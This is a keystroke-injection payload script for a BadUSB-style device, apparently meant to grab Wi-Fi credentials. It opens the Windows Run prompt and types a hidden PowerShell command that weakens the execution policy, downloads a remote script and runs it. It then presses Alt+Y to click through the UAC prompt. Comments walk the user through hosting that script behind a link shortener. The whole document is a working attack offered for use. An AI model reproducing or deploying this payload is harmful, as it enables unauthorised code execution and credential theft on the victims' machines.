layout('es');                   // Spanish keyboard layout
typingSpeed(100,150)    // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

// the powershell script and this payload can be found at
// https://github.com/axel05869/Wifi-Grab
// --------GUIDE---------
// download the powershell script.
// edit and add the required data.
// copy and paste all the text to notepad and save as anyname.txt.
// upload the text to: https://cutt.ly/WjnNPa4
// copy the direct download link.
delay(500)
// Opens the Windows Run prompt.
press("GUI r")
// Delays 0.2 seconds to give the Run prompt time to open.
delay(200)
// this command will download the text and save as d.ps1 then run
// if the script failed to run change the ExecPolicy to Bypass
type("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget "DOWNLOAD_LINK" -o \d.ps1;\d.ps1")
// Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
// Delay 0.5 seconds to give the UAC prompt time to open.
delay(500)
// Presses Alt + Y to bypass UAC.
press("ALT y")
